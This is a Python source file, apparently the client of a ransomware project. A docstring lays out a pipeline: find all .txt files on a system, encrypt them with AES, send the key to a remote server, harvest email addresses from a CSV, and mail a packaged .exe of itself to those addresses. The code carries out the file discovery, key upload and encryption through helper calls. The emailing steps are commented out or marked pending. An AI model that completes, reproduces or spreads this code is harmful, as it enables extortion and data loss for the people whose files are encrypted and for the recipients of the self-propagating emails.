"""
how the pipeline works (when you run the client.exe file):
1. generate 16 character key [OK]
2. find all .txt files on the system [OK]
3. encrypt the files with the key using AES-CBC [Pending] <----------------
4. save the 16char key to a file on the desktop (Key.key) [OK]
5. generate RSA key pair [OK]
6. save the public/private key to a file on the desktop (keyPair.key) [OK]
7. encrypt the 16char key with the public key [OK] 
8. save the encrypted 16char to a file on the desktop (encryptedKey.key) [OK]
9. send the encrypted 16char key to the server [OK]
10. access the csv file and extract emails from it [OK]
11. convert the client.py to .exe file auto-py-to-exe library [OK] <----------------
12. send the .exe file to the emails on the csv file [Pending] <----------------
13. when the .exe file is run, a prompt should popup indicating that the encryption is in progress [Pending] <----------------
14. After encrypting all txt files, the prompt will wait for a 
    key input in order to decrypt the files back. "Enter Key to decrypt" [Pending] <----------------
15. After the key is entered, the files will be decrypted and the prompt will close [Pending] <----------------
"""
from utils import *


# Continue with the rest of your program logic
waitingForKey("start")



#1
ascii_key= "vG7pyhyrDzSnqcJ8"
#generate_key(16)

#2
file_contains_paths ="paths.txt"
findTxtFile( file_contains_paths )

#9
encoded_encrypted_msg = send_to_server(ascii_key)

#3
encrypt_file_paths(ascii_key, file_contains_paths)

#4
saveKey(ascii_key, "Key.key")

#5
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")

#9
waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
encrypt_file_paths(ascii_key, file_contains_paths)


print("Press Enter To Close...")
input()


'''
#3
encrypt_file_paths(ascii_key, file_contains_paths)

#4
saveKey(ascii_key, "Key.key")



#6
key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
saveKey(key_pair, "keyPair.key")



#8
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")

#9
waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
encrypt_file_paths(ascii_key, file_contains_paths)

#9
#send_to_server(encoded_encrypted_msg)

#10
#emails = get_emails_from_csv()

#11 
# convert_to_exe()

#12
# send_to_emails(emails)

#13
'''